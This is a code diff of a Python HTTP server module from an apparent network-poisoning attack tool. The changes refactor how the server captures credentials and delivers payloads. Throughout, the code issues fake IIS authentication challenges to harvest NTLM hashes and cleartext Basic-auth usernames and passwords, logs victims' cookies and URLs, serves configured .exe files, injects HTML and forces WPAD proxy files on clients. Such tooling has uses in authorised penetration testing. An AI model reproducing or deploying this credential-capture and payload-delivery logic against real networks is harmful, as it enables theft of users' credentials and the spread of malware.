@@ -28,7 +28,7 @@ from packets import WPADScript, ServeExeFile, ServeHtmlFile
 
 
 # Parse NTLMv1/v2 hash.
-def ParseHTTPHash(data,client):
+def ParseHTTPHash(data, client):
 	LMhashLen    = struct.unpack('<H',data[12:14])[0]
 	LMhashOffset = struct.unpack('<H',data[16:18])[0]
 	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
@@ -106,10 +106,10 @@ def ServeFile(Filename):
 		bk.close()
 		return data
 
-def RespondWithFile(client, filename):
+def RespondWithFile(client, filename, dlname=None):
 	
 	if filename.endswith('.exe'):
-		Buffer = ServeExeFile(Payload = ServeFile(filename))
+		Buffer = ServeExeFile(Payload = ServeFile(filename), ContentDiFile=dlname)
 	else:
 		Buffer = ServeHtmlFile(Payload = ServeFile(filename))
 
@@ -136,14 +136,16 @@ def PacketSequence(data, client):
 	NTLM_Auth = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
 	Basic_Auth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
 
-	# Send the .exe if needed
+	# Serve the .exe if needed
 	if settings.Config.Serve_Always == True or (settings.Config.Serve_Exe == True and re.findall('.exe', data)):
-		return RespondWithFile(client, settings.Config.Exe_Filename)
+		return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)
 
-	# Send the custom HTML if needed
+	# Serve the custom HTML if needed
 	if settings.Config.Serve_Html == True:
 		return RespondWithFile(client, settings.Config.Html_Filename)
 
+	WPAD_Custom = WpadCustom(data, client)
+	
 	if NTLM_Auth:
 		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
 
@@ -163,25 +165,22 @@ def PacketSequence(data, client):
 		if Packet_NTLM == "\x03":
 			NTLM_Auth = b64decode(''.join(NTLM_Auth))
 			ParseHTTPHash(NTLM_Auth, client)
-			WPAD_Custom = WpadCustom(data, client)
 
 			if settings.Config.Force_WPAD_Auth and WPAD_Custom:
 				print text("[HTTP] WPAD (auth) file sent to %s" % client)
 				return WPAD_Custom
 
 			else:
-				Buffer = IIS_Auth_Granted(Payload=settings.Config.HTMLToServe)
+				Buffer = IIS_Auth_Granted(Payload=settings.Config.HTMLToInject)
 				Buffer.calculate()
 				return str(Buffer)
 
-	if Basic_Auth:
+	elif Basic_Auth:
 		ClearText_Auth = b64decode(''.join(Basic_Auth))
 
 		GrabURL(data, client)
 		GrabHost(data, client)
 		GrabCookie(data, client)
-
-		WPAD_Custom = WpadCustom(data,client)
 
 		print text("[HTTP] (Basic) Client       : %s" % client)
 		print text("[HTTP] (Basic) Username     : %s" % ClearText_Auth.split(':')[0])
@@ -189,16 +188,23 @@ def PacketSequence(data, client):
 		WriteData(settings.Config.HTTPBasicLog % client, ClearText_Auth, ClearText_Auth)
 
 		if settings.Config.Force_WPAD_Auth and WPAD_Custom:
-			print text("[HTTP] WPAD (auth) file sent to %s" % client, 3, 0)
+			print text("[HTTP] WPAD (auth) file sent to %s" % client)
 			return WPAD_Custom
 
 		else:
-			Buffer = IIS_Auth_Granted(Payload=settings.Config.HTMLToServe)
+			Buffer = IIS_Auth_Granted(Payload=settings.Config.HTMLToInject)
 			Buffer.calculate()
 			return str(Buffer)
 
 	else:
-		Response = IIS_Basic_401_Ans() if settings.Config.Basic == True else IIS_Auth_401_Ans()
+		if settings.Config.Basic == True:
+			Response = IIS_Basic_401_Ans()
+			print text("[HTTP] Sending BASIC authentication request to %s" % client)
+
+		else:
+			Response = IIS_Auth_401_Ans()
+			print text("[HTTP] Sending NTLM authentication request to %s" % client)
+
 		return str(Response)
 
 # HTTP Server class
